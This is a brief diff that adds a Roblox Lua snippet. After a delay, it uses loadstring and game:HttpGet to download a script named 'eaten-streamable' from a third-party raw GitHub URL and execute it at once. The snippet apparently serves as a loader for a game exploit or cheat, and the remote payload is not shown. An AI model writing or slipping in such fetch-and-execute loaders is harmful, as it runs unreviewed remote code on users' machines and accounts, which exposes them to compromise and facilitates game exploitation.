@@ -1,0 +1,4 @@
+wait(12)
+--eaten-streamable
+loadstring(game:HttpGet("https://raw.githubusercontent.com/T0xicJacob/eatensdad/main/eaten-streamable", true))()
+--eaten-streamable
